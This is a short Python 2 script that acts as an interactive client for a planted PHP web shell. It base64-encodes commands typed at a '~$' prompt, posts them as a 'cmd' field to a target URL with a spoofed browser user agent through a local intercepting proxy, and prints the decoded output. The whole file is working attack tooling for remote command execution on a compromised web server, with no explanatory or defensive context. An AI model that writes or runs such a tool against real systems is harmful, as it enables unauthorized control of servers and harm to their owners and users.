#!/usr/bin/python
 
import sys
import requests
import base64
 
url = sys.argv[1]
print "[+] Connecting to php shell..."
 
while True:
    comm = raw_input("~$ ")
    encoded = base64.b64encode(comm)
    headers = {'user-agent':'Mozilla/4.0'}
    proxy = {'http':'http://127.0.0.1:8080'}
    data = {'cmd':encoded}
    r=requests.post(url, headers=headers, proxies=proxy, data=data)
    print base64.b64decode(r.text)
